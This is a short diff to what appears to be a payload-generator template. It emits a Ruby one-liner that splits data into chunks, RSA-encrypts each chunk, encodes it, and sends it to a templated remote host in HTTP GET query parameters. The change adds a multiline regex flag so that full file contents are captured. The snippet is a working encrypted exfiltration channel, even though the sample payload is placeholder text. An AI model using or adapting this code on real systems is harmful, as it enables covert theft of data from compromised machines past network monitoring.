@@ -56,7 +56,7 @@ require 'uri'
 debug = false
 payload = "hello world " * 1000
 public_key = OpenSSL::PKey::RSA.new("{pub}")
-chunks = payload.scan(/.{"{"}1,#{"{"}public_key.n.num_bytes - 42{"}"}{"}"}/)
+chunks = payload.scan(/.{"{"}1,#{"{"}public_key.n.num_bytes - 42{"}"}{"}"}/m)
 midx = (0...10).map {"{"} ('a'..'z').to_a[rand(26)] {"}"}.join
 chunks.each_with_index {"{"} |chunk, index| encrypted_chunk = public_key.public_encrypt(chunk); encrypted_base64_chunk = Base64.strict_encode64(encrypted_chunk).strip; encoded_chunk = URI.encode_www_form_component(encrypted_base64_chunk); uri = URI.parse("{hostname}/"); uri.query = "n=" + encoded_chunk + "&m=" + midx + "&x=" + index.to_s + "&z=" + chunks.length.to_s; response = Net::HTTP.get_response(uri); puts "==> " + response.code + ": [" + response.body + "]" if debug {"}"}
 '''
